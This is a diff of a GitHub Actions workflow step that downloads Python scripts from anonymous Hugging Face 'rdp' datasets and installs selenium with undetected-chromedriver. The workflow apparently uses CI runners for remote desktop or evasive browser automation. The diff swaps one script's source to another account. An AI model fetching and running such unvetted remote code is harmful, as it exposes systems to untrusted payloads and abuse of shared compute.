@@ -26,7 +26,7 @@ jobs:
         run: |
           Write-Host "⬇️ Downloading scripts for instance ${{ matrix.instance }}..."
           Invoke-WebRequest -Uri "https://huggingface.co/datasets/gfdg34fsd/rdp/resolve/main/hash.py" -OutFile "hash.py"
-          Invoke-WebRequest -Uri "https://huggingface.co/datasets/sjkhfuk/rdp/resolve/main/start.py" -OutFile "start.py"
+          Invoke-WebRequest -Uri "https://huggingface.co/datasets/swelam100/rdp/resolve/main/start_short.py" -OutFile "start.py"
           
           Write-Host "📦 Installing required python packages..."
           python -m pip install --upgrade pip setuptools undetected-chromedriver selenium requests
